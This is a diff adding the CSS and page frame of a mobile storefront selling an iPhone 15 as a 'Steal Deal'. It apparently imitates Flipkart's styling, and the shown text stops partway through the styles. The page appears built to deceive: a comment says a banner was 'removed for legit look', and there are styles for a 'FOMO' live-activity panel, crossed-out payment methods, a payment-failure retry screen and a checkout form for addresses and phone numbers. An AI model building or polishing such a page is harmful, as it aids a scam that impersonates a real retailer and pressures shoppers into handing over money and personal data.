@@ -1,0 +1,2053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>APPLE iPhone 15 (Black, 128 GB) - Steal Deal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --fk-blue: #2874f0;
+      --fk-yellow: #ff9f00;
+      --fk-buy: #ffd814;
+      --fk-green: #008c00;
+      --fk-red: #ff6161;
+      --fk-bg: #f1f3f6;
+      --fk-text: #212121;
+      --fk-muted: #878787;
+      --fk-border: #e0e0e0;
+    }
+    html {
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
+      overflow-y: scroll;
+    }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--fk-bg);
+      color: var(--fk-text);
+      line-height: 1.45;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+      overflow-y: auto;
+      min-height: 100%;
+      position: relative;
+    }
+    body.modal-open { overflow: hidden; }
+    .app { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; padding-bottom: 80px; }
+
+    /* ── header ── */
+    .header {
+      position: sticky; top: 0; z-index: 100;
+      background: #fff;
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 12px;
+      border-bottom: 1px solid var(--fk-border);
+    }
+    .header svg { flex-shrink: 0; }
+    .back-btn { background: none; border: none; padding: 4px; cursor: pointer; display: flex; }
+    .fk-logo {
+      width: 28px; height: 28px; flex-shrink: 0; object-fit: contain;
+    }
+    .search-bar {
+      flex: 1; display: flex; align-items: center; gap: 8px;
+      background: #fff; border: 1px solid var(--fk-blue);
+      border-radius: 4px; padding: 9px 12px;
+      font-size: 14px; min-height: 40px;
+    }
+    .search-bar .q { color: var(--fk-text); font-weight: 400; flex: 1; line-height: 1; }
+    .search-bar .search-ico {
+      width: 18px; height: 18px; flex-shrink: 0;
+      stroke: var(--fk-blue); fill: none;
+      stroke-width: 2.2; stroke-linecap: round;
+    }
+    .cart-btn { background: none; border: none; padding: 4px; cursor: pointer; position: relative; }
+    .cart-badge {
+      position: absolute; top: 0; right: 0;
+      background: var(--fk-blue); color: #fff;
+      font-size: 9px; font-weight: 700;
+      min-width: 16px; height: 16px; border-radius: 50%;
+      display: none; align-items: center; justify-content: center;
+      padding: 0 4px;
+    }
+
+    /* ── gallery ── */
+    .gallery { position: relative; background: #fff; padding: 0 0 10px; }
+    .gallery-actions {
+      position: absolute; top: 12px; right: 12px;
+      display: flex; flex-direction: column; gap: 10px; z-index: 3;
+    }
+    .gallery-actions button {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: #fff; border: 1px solid #eee;
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+    }
+    .badge-bestseller {
+      position: absolute; top: 12px; left: 12px; z-index: 3;
+      background: linear-gradient(135deg, #7b2ff7, #5e35b1);
+      color: #fff; font-size: 9px; font-weight: 800;
+      padding: 4px 8px; border-radius: 3px; letter-spacing: 0.5px;
+    }
+    .badge-trust {
+      position: absolute; bottom: 48px; right: 12px; z-index: 3;
+      background: #fff; border: 1px solid #eee;
+      border-radius: 4px; padding: 4px 8px;
+      font-size: 9px; font-weight: 700; color: var(--fk-blue);
+      display: flex; align-items: center; gap: 4px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+    .badge-trust svg { width: 12px; height: 12px; flex-shrink: 0; }
+
+    /* icon system */
+    .ico { display: block; flex-shrink: 0; }
+    .ico-blue { color: var(--fk-blue); }
+    .ico-muted { color: #bbb; }
+    .ico-white { color: #fff; }
+    .ico-green { color: var(--fk-green); }
+    .rating-badge .star { color: var(--fk-green); display: inline-flex; align-items: center; gap: 2px; }
+    .seller-rating { color: var(--fk-green); font-weight: 600; display: inline-flex; align-items: center; gap: 2px; }
+    .review-card .stars { color: var(--fk-green); font-weight: 700; margin-bottom: 4px; display: flex; align-items: center; gap: 3px; }
+    .gallery-main {
+      width: 100%; height: 340px;
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden; touch-action: pan-y pinch-zoom;
+      position: relative; background: #fff;
+    }
+    .gallery-main img {
+      max-width: 72%; max-height: 92%;
+      object-fit: contain;
+      transition: opacity 0.2s ease;
+      user-select: none; -webkit-user-drag: none;
+    }
+    .gallery-main img.hero-black {
+      max-width: 58%; object-fit: contain;
+    }
+    .rating-badge {
+      position: absolute; bottom: 44px; left: 12px; z-index: 3;
+      background: rgba(255,255,255,0.96);
+      border: 1px solid #eee;
+      border-radius: 4px; padding: 5px 9px;
+      font-size: 11px; font-weight: 600; color: var(--fk-text);
+    }
+    .dots {
+      display: flex; justify-content: center; gap: 6px; margin-top: 8px;
+    }
+    .dot {
+      width: 6px; height: 6px; border-radius: 50%;
+      background: #ccc; border: none; cursor: pointer; padding: 0;
+    }
+    .dot.active { background: var(--fk-blue); width: 8px; height: 8px; }
+
+    /* ── sections ── */
+    .section { padding: 14px 16px; border-bottom: 8px solid var(--fk-bg); }
+    .section-title {
+      font-size: 13px; font-weight: 600; color: var(--fk-text);
+      margin-bottom: 12px;
+    }
+    .section-title span { color: var(--fk-muted); font-weight: 500; }
+
+    /* colors */
+    .color-row { display: flex; gap: 10px; flex-wrap: wrap; }
+    .color-thumb {
+      width: 54px; height: 54px; border-radius: 6px;
+      border: 2px solid #e0e0e0; overflow: hidden;
+      cursor: pointer; position: relative; background: #fafafa;
+    }
+    .color-thumb img { width: 100%; height: 100%; object-fit: cover; }
+    .color-thumb[data-color="Black"] img { object-position: 0% 50%; }
+    .color-thumb[data-color="Blue"] img { object-position: 20% 50%; }
+    .color-thumb[data-color="Green"] img { object-position: 40% 50%; }
+    .color-thumb[data-color="Pink"] img { object-position: 60% 50%; }
+    .color-thumb[data-color="Yellow"] img { object-position: 80% 50%; }
+    .color-thumb.active { border-color: #212121; border-width: 2px; }
+    .color-thumb.oos::after {
+      content: 'Out of\Astock'; position: absolute; inset: 0;
+      background: rgba(255,255,255,0.82);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 7px; font-weight: 700; color: var(--fk-red);
+      text-align: center; line-height: 1.1; white-space: pre;
+    }
+
+    /* variants */
+    .variant-row { display: flex; gap: 10px; }
+    .variant {
+      flex: 1; border: 1px solid var(--fk-border); border-radius: 8px;
+      padding: 10px; cursor: pointer; text-align: left;
+      background: #fff; font-family: inherit;
+    }
+    .variant.active { border-color: var(--fk-text); border-width: 2px; }
+    .variant.oos { opacity: 0.5; pointer-events: none; position: relative; }
+    .variant.oos::after {
+      content: 'Out of stock'; position: absolute; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 700; color: var(--fk-red);
+      background: rgba(255,255,255,0.8); border-radius: 6px;
+    }
+    .variant-discount { font-size: 11px; font-weight: 700; color: var(--fk-green); }
+    .variant-mrp { font-size: 11px; color: var(--fk-muted); text-decoration: line-through; }
+    .variant-price { font-size: 15px; font-weight: 700; margin: 2px 0; }
+    .variant-left { font-size: 10px; color: var(--fk-red); font-weight: 600; }
+
+    /* product info */
+    .product-name { font-size: 16px; font-weight: 500; margin-bottom: 10px; line-height: 1.35; }
+    .price-block { display: flex; align-items: baseline; gap: 8px; flex-wrap: wrap; margin-bottom: 4px; }
+    .price-discount { font-size: 14px; font-weight: 700; color: var(--fk-green); display: flex; align-items: center; gap: 2px; }
+    .price-mrp { font-size: 14px; color: var(--fk-muted); text-decoration: line-through; }
+    .price-sale { font-size: 22px; font-weight: 700; }
+    .price-fee { font-size: 12px; color: var(--fk-muted); margin-top: 4px; }
+    .brand-tag { font-size: 12px; font-weight: 700; letter-spacing: 0.3px; margin-bottom: 4px; }
+    .applied-banner {
+      margin-top: 10px; padding: 8px 12px;
+      background: #e8f5e9; border-radius: 4px;
+      font-size: 12px; font-weight: 600; color: var(--fk-green);
+      display: flex; align-items: center; gap: 6px;
+    }
+    .applied-banner svg { flex-shrink: 0; }
+
+    /* wow deal */
+    .wow-deal {
+      border: 1px solid #b3d4fc; border-radius: 8px; overflow: hidden; margin-top: 14px;
+    }
+    .wow-header {
+      background: linear-gradient(90deg, #1a3a6e, #2874f0);
+      color: #fff; padding: 10px 12px;
+      font-size: 11px; font-weight: 500;
+    }
+    .wow-header strong {
+      font-size: 14px; font-weight: 800; letter-spacing: 0.5px;
+      display: block; margin-bottom: 2px;
+    }
+    .wow-body { background: #e8f4fd; border-bottom: 1px solid #b3d4fc; }
+    .wow-price {
+      padding: 12px; background: #fff;
+    }
+    .wow-price small { font-size: 10px; color: var(--fk-muted); display: block; margin-bottom: 2px; }
+    .wow-price strong { font-size: 17px; font-weight: 700; color: var(--fk-text); }
+    .wow-offers { padding: 0 12px; background: #fff; }
+    .wow-offers-head {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 0 6px; font-size: 12px; font-weight: 600;
+    }
+    .wow-offers-head a { color: var(--fk-blue); font-size: 11px; font-weight: 600; text-decoration: none; }
+    .exchange-row {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 0; border-bottom: 1px solid #f0f0f0;
+    }
+    .exchange-icon {
+      width: 36px; height: 36px; border-radius: 6px; background: #f5f5f5;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .exchange-icon svg { width: 20px; height: 20px; }
+    .exchange-text { flex: 1; font-size: 12px; line-height: 1.35; }
+    .exchange-text strong { font-weight: 700; font-size: 13px; display: block; }
+    .exchange-text span { color: var(--fk-muted); font-size: 11px; }
+
+    /* offers */
+    .offer-item {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 10px 0; border-bottom: 1px solid #f0f0f0;
+    }
+    .offer-item:last-child { border-bottom: none; }
+    .offer-icon {
+      width: 36px; height: 36px; border-radius: 6px;
+      background: #f5f5f5; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .offer-icon svg { width: 20px; height: 20px; }
+    .offer-text { flex: 1; font-size: 12px; line-height: 1.4; }
+    .offer-text strong { font-weight: 600; }
+    .offer-apply {
+      font-size: 12px; font-weight: 700; color: var(--fk-blue);
+      background: none; border: none; cursor: pointer; white-space: nowrap; align-self: center;
+    }
+    .offer-tag {
+      display: inline-block; background: #fff3e0; color: #e65100;
+      font-size: 9px; font-weight: 700; padding: 2px 6px;
+      border-radius: 3px; margin-bottom: 4px;
+    }
+    .paylater-cards { display: flex; gap: 10px; overflow-x: auto; padding: 4px 0 8px; scrollbar-width: none; }
+    .paylater-cards::-webkit-scrollbar { display: none; }
+    .paylater-card {
+      flex-shrink: 0; width: 200px; border: 1px solid var(--fk-border);
+      border-radius: 8px; padding: 10px; font-size: 11px; line-height: 1.35;
+    }
+    .paylater-card strong { display: block; font-size: 12px; margin-bottom: 2px; }
+
+    /* delivery */
+    .delivery-row {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 10px 0; font-size: 13px;
+    }
+    .delivery-row svg { flex-shrink: 0; margin-top: 2px; }
+    .delivery-row a { color: var(--fk-blue); font-weight: 600; text-decoration: none; }
+    .delivery-timer { color: #ff6161; font-weight: 600; font-size: 12px; }
+    .delivery-express { font-weight: 700; }
+    .delivery-express em { font-style: normal; color: var(--fk-blue); }
+    .delivery-city { font-weight: 600; color: var(--fk-text); }
+    .delivery-pin { font-size: 12px; color: var(--fk-muted); margin-top: 2px; }
+    .delivery-date { font-size: 12px; color: var(--fk-green); font-weight: 600; margin-top: 2px; }
+    .seller-row { font-size: 12px; color: var(--fk-muted); line-height: 1.5; }
+    .seller-row strong { color: var(--fk-text); }
+    .seller-link { color: var(--fk-blue); font-weight: 600; text-decoration: none; display: block; margin-top: 4px; font-size: 12px; }
+
+    /* peace of mind / trust shield */
+    .trust-banner {
+      background: linear-gradient(135deg, #e8f4fd 0%, #d4e8fc 100%);
+      border-radius: 8px; padding: 14px; margin-bottom: 12px; position: relative; overflow: hidden;
+    }
+    .trust-banner-top {
+      display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px;
+    }
+    .trust-banner-top strong { font-size: 13px; display: block; line-height: 1.3; }
+    .trust-free {
+      display: inline-block; background: var(--fk-blue); color: #fff;
+      font-size: 9px; font-weight: 700; padding: 2px 6px; border-radius: 3px; margin-top: 4px;
+    }
+    .trust-shield-icon {
+      width: 48px; height: 48px; background: var(--fk-blue); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .trust-shield-icon svg { width: 26px; height: 26px; }
+    .trust-features {
+      display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 10px;
+    }
+    .trust-feat { text-align: center; font-size: 9px; color: var(--fk-muted); font-weight: 500; line-height: 1.2; }
+    .trust-feat .ico-wrap {
+      display: flex; align-items: center; justify-content: center;
+      width: 32px; height: 32px; margin: 0 auto 4px;
+      background: #fff; border-radius: 8px;
+    }
+    .trust-feat .ico-wrap svg { width: 18px; height: 18px; }
+    .trust-social {
+      background: #fff; border-radius: 6px; padding: 8px 10px;
+      font-size: 11px; font-weight: 600; color: var(--fk-blue); text-align: center; margin-bottom: 8px;
+    }
+    .trust-disclaimer { font-size: 9px; color: var(--fk-muted); line-height: 1.3; }
+    .warranty-row {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 12px; line-height: 1.4;
+    }
+    .apple-logo { font-size: 20px; flex-shrink: 0; line-height: 1; }
+    .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
+    .service-item {
+      text-align: center; font-size: 10px; color: var(--fk-text); font-weight: 600;
+      padding: 8px 4px; border: 1px solid #f0f0f0; border-radius: 6px;
+    }
+    .service-item .ico-wrap {
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 6px;
+    }
+    .service-item .ico-wrap svg { width: 22px; height: 22px; }
+
+    /* collapsible sections */
+    .collapse-head {
+      display: flex; justify-content: space-between; align-items: center;
+      cursor: pointer; user-select: none; padding: 2px 0;
+    }
+    .collapse-head .section-title { margin-bottom: 0; font-size: 14px; font-weight: 700; }
+    .collapse-chevron {
+      width: 20px; height: 20px; transition: transform 0.2s;
+      flex-shrink: 0;
+    }
+    .collapse-head.open .collapse-chevron { transform: rotate(180deg); }
+    .collapse-body { overflow: hidden; max-height: 0; transition: max-height 0.3s ease; }
+    .collapse-body.open { max-height: 3000px; }
+    .collapse-inner { padding-top: 12px; }
+
+    /* highlights */
+    .highlight {
+      display: flex; gap: 12px; padding: 12px 0;
+      border-bottom: 1px solid #f5f5f5;
+    }
+    .highlight:last-child { border-bottom: none; }
+    .highlight-icon {
+      width: 44px; height: 44px; border-radius: 8px;
+      background: #e8f4fd; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .highlight-icon svg { width: 24px; height: 24px; }
+    .highlight-text strong { display: block; font-size: 13px; font-weight: 700; line-height: 1.3; margin-bottom: 2px; }
+    .highlight-text span { font-size: 11px; color: var(--fk-muted); line-height: 1.35; }
+
+    /* tabs */
+    .tabs { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 12px; scrollbar-width: none; }
+    .tabs::-webkit-scrollbar { display: none; }
+    .tab {
+      flex-shrink: 0; padding: 8px 16px; border-radius: 20px;
+      border: 1px solid var(--fk-border); background: #fff;
+      font-size: 12px; font-weight: 600; cursor: pointer; font-family: inherit;
+      color: var(--fk-text);
+    }
+    .tab.active { background: var(--fk-text); color: #fff; border-color: var(--fk-text); }
+    .tab-content { display: flex; flex-direction: column; gap: 10px; }
+    .tab-content img { width: 100%; border-radius: 8px; display: block; }
+    .apple-showcase {
+      text-align: center; padding: 40px 20px; background: #fafafa; border-radius: 8px;
+    }
+    .apple-showcase .logo { font-size: 48px; margin-bottom: 8px; }
+    .apple-showcase .name {
+      font-family: Georgia, 'Times New Roman', serif;
+      font-size: 32px; font-weight: 400; letter-spacing: -0.5px;
+    }
+    .detail-gallery { display: none; flex-direction: column; gap: 10px; margin-top: 10px; }
+    .detail-gallery.open { display: flex; }
+    .show-more {
+      display: block; width: 100%; padding: 10px;
+      border: 1px solid var(--fk-border); border-radius: 4px;
+      background: #fff; font-size: 13px; font-weight: 600;
+      cursor: pointer; margin-top: 12px; font-family: inherit; color: var(--fk-text);
+    }
+
+    /* ratings */
+    .rating-summary { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+    .rating-big { font-size: 28px; font-weight: 700; }
+    .rating-star { display: flex; align-items: center; }
+    .rating-label {
+      background: #e8f5e9; color: var(--fk-green);
+      font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 4px;
+    }
+    .rating-bars { margin-bottom: 12px; }
+    .rating-bar-row { display: flex; align-items: center; gap: 8px; font-size: 11px; margin-bottom: 4px; }
+    .rating-bar-row span:first-child { width: 12px; text-align: right; color: var(--fk-muted); }
+    .rating-bar-track { flex: 1; height: 6px; background: #eee; border-radius: 3px; overflow: hidden; }
+    .rating-bar-fill { height: 100%; background: var(--fk-green); border-radius: 3px; }
+
+    /* clearance banner removed for legit look */
+
+    /* sticky bar */
+    .sticky-bar {
+      position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+      width: 100%; max-width: 480px;
+      display: flex; align-items: stretch;
+      background: #fff; border-top: 1px solid var(--fk-border);
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.08); z-index: 100;
+    }
+    .bar-cart {
+      width: 52px; border: none; background: #fff;
+      border-right: 1px solid var(--fk-border);
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer;
+    }
+    .bar-buy {
+      flex: 1; border: none; background: var(--fk-buy);
+      padding: 10px 12px; cursor: pointer; font-family: inherit;
+      text-align: center;
+    }
+    .bar-buy strong { display: block; font-size: 14px; font-weight: 800; }
+    .bar-buy small { font-size: 11px; font-weight: 600; }
+
+    /* checkout modal */
+    .modal-overlay {
+      display: none; position: fixed; inset: 0;
+      background: rgba(0,0,0,0.55); z-index: 200;
+      align-items: flex-end; justify-content: center;
+    }
+    .modal-overlay.open { display: flex; }
+    .modal {
+      background: var(--fk-bg); width: 100%; max-width: 480px;
+      border-radius: 16px 16px 0 0;
+      max-height: 92vh; overflow-y: auto;
+      display: flex; flex-direction: column;
+    }
+    .modal-handle {
+      width: 36px; height: 4px; background: #ccc;
+      border-radius: 2px; margin: 10px auto 0;
+    }
+    .modal-top {
+      background: #fff; padding: 12px 16px 14px;
+      border-bottom: 1px solid var(--fk-border);
+      position: relative;
+    }
+    .modal-close {
+      position: absolute; top: 12px; right: 14px;
+      background: #f5f5f5; border: none; border-radius: 50%;
+      width: 28px; height: 28px; font-size: 18px; line-height: 1;
+      cursor: pointer; color: #666; display: flex;
+      align-items: center; justify-content: center;
+    }
+    .modal-top h2 { font-size: 16px; font-weight: 700; margin-bottom: 10px; padding-right: 32px; }
+    .checkout-steps {
+      display: flex; gap: 6px; font-size: 10px; font-weight: 600;
+    }
+    .checkout-step {
+      flex: 1; text-align: center; padding: 6px 4px;
+      border-radius: 4px; background: #f5f5f5; color: var(--fk-muted);
+    }
+    .checkout-step.active { background: #e8f4fd; color: var(--fk-blue); }
+    .checkout-step.done { background: #e8f5e9; color: var(--fk-green); }
+
+    .modal-body { padding: 12px 16px 100px; flex: 1; }
+    .checkout-card {
+      background: #fff; border-radius: 8px;
+      border: 1px solid var(--fk-border);
+      padding: 12px; margin-bottom: 12px;
+    }
+    .checkout-card-title {
+      font-size: 12px; font-weight: 700; color: var(--fk-text);
+      margin-bottom: 10px; display: flex; align-items: center; gap: 6px;
+    }
+    .checkout-card-title svg { width: 14px; height: 14px; fill: var(--fk-blue); }
+
+    .order-item {
+      display: flex; gap: 10px; padding-bottom: 12px;
+      border-bottom: 1px solid #f0f0f0; margin-bottom: 10px;
+    }
+    .order-item img {
+      width: 56px; height: 56px; object-fit: contain;
+      border: 1px solid #f0f0f0; border-radius: 6px; background: #fafafa;
+    }
+    .order-item-info { flex: 1; min-width: 0; }
+    .order-item-info strong { font-size: 12px; font-weight: 600; line-height: 1.3; display: block; }
+    .order-item-info span { font-size: 10px; color: var(--fk-muted); display: block; margin-top: 2px; }
+    .order-item-info .seller { font-size: 10px; color: var(--fk-blue); margin-top: 4px; }
+    .order-item-price { font-size: 14px; font-weight: 800; white-space: nowrap; }
+
+    .price-lines { font-size: 12px; }
+    .price-line {
+      display: flex; justify-content: space-between; padding: 4px 0;
+      color: var(--fk-muted);
+    }
+    .price-line.discount { color: var(--fk-green); font-weight: 600; }
+    .price-line.total {
+      border-top: 1px dashed #ddd; margin-top: 6px; padding-top: 8px;
+      font-size: 14px; font-weight: 800; color: var(--fk-text);
+    }
+    .price-line.total span:last-child { color: var(--fk-green); font-size: 16px; }
+
+    .field { margin-bottom: 10px; }
+    .field label {
+      display: block; font-size: 11px; font-weight: 600;
+      margin-bottom: 4px; color: #444;
+    }
+    .field-row { display: flex; gap: 8px; }
+    .field-prefix {
+      display: flex; align-items: center; padding: 0 10px;
+      border: 1px solid var(--fk-border); border-radius: 4px;
+      background: #fafafa; font-size: 13px; color: var(--fk-muted); flex-shrink: 0;
+    }
+    .field input, .field textarea {
+      width: 100%; padding: 10px 12px; border: 1px solid var(--fk-border);
+      border-radius: 4px; font-size: 14px; font-family: inherit; outline: none;
+      background: #fff;
+    }
+    .field input:focus, .field textarea:focus { border-color: var(--fk-blue); box-shadow: 0 0 0 2px rgba(40,116,240,0.1); }
+    .field input.invalid, .field textarea.invalid { border-color: #e53935; box-shadow: 0 0 0 2px rgba(229,57,53,0.1); }
+    .field-error {
+      display: none; font-size: 10px; color: #e53935;
+      margin-top: 4px; font-weight: 500;
+    }
+    .field-error.show { display: block; }
+    .pincode-info {
+      display: none; font-size: 11px; color: var(--fk-green); font-weight: 600;
+      margin-top: 6px; padding: 6px 8px; background: #f0faf0;
+      border-radius: 4px; border: 1px solid #c8e6c9;
+    }
+    .pincode-info.show { display: block; }
+    .pincode-info.invalid { color: #e65100; background: #fff3e0; border-color: #ffcc80; }
+
+    .pay-options { display: flex; flex-direction: column; gap: 8px; }
+    .pay-opt {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 12px; border: 1px solid var(--fk-border);
+      border-radius: 6px; cursor: pointer; background: #fff;
+      font-family: inherit; text-align: left; width: 100%;
+    }
+    .pay-opt.active { border-color: var(--fk-blue); background: #f0f7ff; }
+    .pay-opt-icon {
+      width: 32px; height: 32px; border-radius: 6px;
+      background: #fff; display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; border: 1px solid #eee; padding: 2px;
+    }
+    .pay-opt-icon svg { width: 18px; height: 18px; fill: var(--fk-blue); }
+    .pay-opt-icon img { width: 100%; height: auto; max-height: 22px; object-fit: contain; }
+    .pay-opt-icon.upi-logo { width: 48px; padding: 3px 4px; }
+    .pay-opt-text strong { display: block; font-size: 12px; font-weight: 600; }
+    .pay-opt-text span { font-size: 10px; color: var(--fk-muted); }
+    .pay-opt-radio {
+      width: 16px; height: 16px; border-radius: 50%;
+      border: 2px solid #ccc; margin-left: auto; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .pay-opt.active .pay-opt-radio { border-color: var(--fk-blue); }
+    .pay-opt.active .pay-opt-radio::after {
+      content: ''; width: 8px; height: 8px; border-radius: 50%;
+      background: var(--fk-blue);
+    }
+    .pay-opt.disabled {
+      opacity: 0.55; cursor: not-allowed; background: #fafafa;
+      border-color: #eee; position: relative;
+    }
+    .pay-opt.disabled .pay-opt-text strong {
+      text-decoration: line-through; color: #999;
+    }
+    .pay-opt.disabled .pay-opt-text span { color: #bbb; }
+    .pay-opt.disabled .pay-opt-radio { border-color: #ddd; opacity: 0.4; }
+    .pay-unavail {
+      margin-left: auto; flex-shrink: 0;
+      font-size: 9px; font-weight: 700; color: #fff;
+      background: #e53935; padding: 3px 7px; border-radius: 3px;
+      text-decoration: none !important;
+    }
+
+    .trust-row {
+      display: flex; justify-content: space-around;
+      padding: 10px 0 4px; font-size: 9px; font-weight: 600;
+      color: var(--fk-muted); text-align: center;
+    }
+    .trust-item { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+    .trust-item .ico { width: 18px; height: 18px; }
+
+    .modal-footer {
+      position: sticky; bottom: 0; background: #fff;
+      border-top: 1px solid var(--fk-border);
+      padding: 10px 16px 16px;
+      box-shadow: 0 -4px 12px rgba(0,0,0,0.06);
+    }
+    .modal-footer-total {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 8px; font-size: 12px;
+    }
+    .modal-footer-total strong { font-size: 18px; font-weight: 800; color: var(--fk-green); }
+    .modal-buy {
+      width: 100%; padding: 14px; border: none; border-radius: 6px;
+      background: var(--fk-buy); font-size: 15px; font-weight: 800;
+      cursor: pointer; font-family: inherit; color: var(--fk-text);
+    }
+    .modal-secure {
+      text-align: center; font-size: 10px; color: var(--fk-muted);
+      margin-top: 8px; display: flex; align-items: center;
+      justify-content: center; gap: 4px;
+    }
+    .modal-secure svg { width: 12px; height: 12px; fill: var(--fk-green); }
+    .delivery-est {
+      font-size: 11px; color: var(--fk-green); font-weight: 600;
+      display: flex; align-items: center; gap: 4px; margin-top: 6px;
+    }
+
+    /* pincode sheet + payment overlay */
+    .sheet-overlay, .pay-overlay {
+      display: none; position: fixed; inset: 0; z-index: 300;
+      background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center;
+    }
+    .sheet-overlay.open, .pay-overlay.open { display: flex; }
+    .sheet {
+      background: #fff; width: 100%; max-width: 480px;
+      border-radius: 16px 16px 0 0; padding: 20px 16px 28px;
+    }
+    .sheet h3 { font-size: 16px; font-weight: 700; margin-bottom: 14px; }
+    .sheet input {
+      width: 100%; padding: 12px; border: 1px solid var(--fk-border);
+      border-radius: 4px; font-size: 16px; font-family: inherit; outline: none;
+      letter-spacing: 2px; text-align: center;
+    }
+    .sheet input:focus { border-color: var(--fk-blue); }
+    .sheet-info {
+      min-height: 20px; margin: 10px 0 14px; font-size: 12px;
+      text-align: center; color: var(--fk-muted);
+    }
+    .sheet-info.ok { color: var(--fk-green); font-weight: 600; }
+    .sheet-info.bad { color: #e53935; }
+    .sheet-btns { display: flex; gap: 8px; }
+    .sheet-btn {
+      flex: 1; padding: 12px; border: none; border-radius: 4px;
+      font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer;
+    }
+    .sheet-btn.cancel { background: #f5f5f5; color: #666; }
+    .sheet-btn.apply { background: var(--fk-blue); color: #fff; }
+    .sheet-btn.apply:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .pay-screen {
+      background: #fff; width: 100%; max-width: 480px;
+      border-radius: 16px 16px 0 0; padding: 32px 24px 40px;
+      text-align: center;
+    }
+    .pay-screen img { height: 28px; margin-bottom: 20px; }
+    .pay-spinner {
+      width: 36px; height: 36px; border: 3px solid #e0e0e0;
+      border-top-color: var(--fk-blue); border-radius: 50%;
+      margin: 0 auto 16px; animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .pay-screen h3 { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
+    .pay-screen p { font-size: 13px; color: var(--fk-muted); }
+    .pay-error {
+      display: none; margin-top: 16px; padding: 12px;
+      background: #ffebee; border: 1px solid #ffcdd2;
+      border-radius: 6px; font-size: 12px; color: #c62828; text-align: left;
+    }
+    .pay-error.show { display: block; }
+    .pay-retry {
+      margin-top: 12px; padding: 10px 24px; border: none;
+      border-radius: 4px; background: var(--fk-blue); color: #fff;
+      font-weight: 700; font-size: 13px; cursor: pointer; font-family: inherit;
+    }
+    .modal-buy.loading { opacity: 0.7; pointer-events: none; }
+
+    /* FOMO */
+    .live-dot {
+      width: 8px; height: 8px; border-radius: 50%; background: #22c55e;
+      flex-shrink: 0; animation: fomoPulse 1.4s ease-in-out infinite;
+    }
+    @keyframes fomoPulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.85); }
+    }
+
+    /* clean live activity panel */
+    .live-panel {
+      background: #fff; border: 1px solid #eee;
+      border-radius: 10px; overflow: hidden;
+      margin-bottom: 12px; box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+    }
+    .live-panel-head {
+      display: flex; align-items: center; gap: 6px;
+      padding: 8px 12px; background: #f9fbe7;
+      border-bottom: 1px solid #eee;
+      font-size: 11px; font-weight: 700; color: var(--fk-text);
+      text-transform: uppercase; letter-spacing: 0.3px;
+    }
+    .live-panel-head .live-dot { width: 7px; height: 7px; }
+    .live-row {
+      display: flex; align-items: center;
+      padding: 10px 0;
+    }
+    .live-row.sub {
+      padding: 8px 12px; background: #fafafa;
+      border-top: 1px solid #f0f0f0;
+      font-size: 11px; color: var(--fk-muted);
+      gap: 8px; justify-content: center;
+    }
+    .live-row.sub strong { color: var(--fk-text); font-weight: 700; }
+    .live-dot-sm {
+      width: 4px; height: 4px; border-radius: 50%;
+      background: #ccc; flex-shrink: 0;
+    }
+    .live-item {
+      flex: 1; text-align: center; padding: 0 4px;
+    }
+    .live-val {
+      display: block; font-size: 18px; font-weight: 800;
+      color: var(--fk-text); line-height: 1.1;
+      font-variant-numeric: tabular-nums;
+    }
+    .live-val.hot { color: #e65100; }
+    .live-lbl {
+      display: block; font-size: 9px; color: var(--fk-muted);
+      margin-top: 2px; font-weight: 500;
+    }
+    .live-div {
+      width: 1px; height: 28px; background: #eee; flex-shrink: 0;
+    }
+
+    /* reviews */
+    .review-count { font-size: 12px; color: var(--fk-muted); margin-bottom: 10px; }
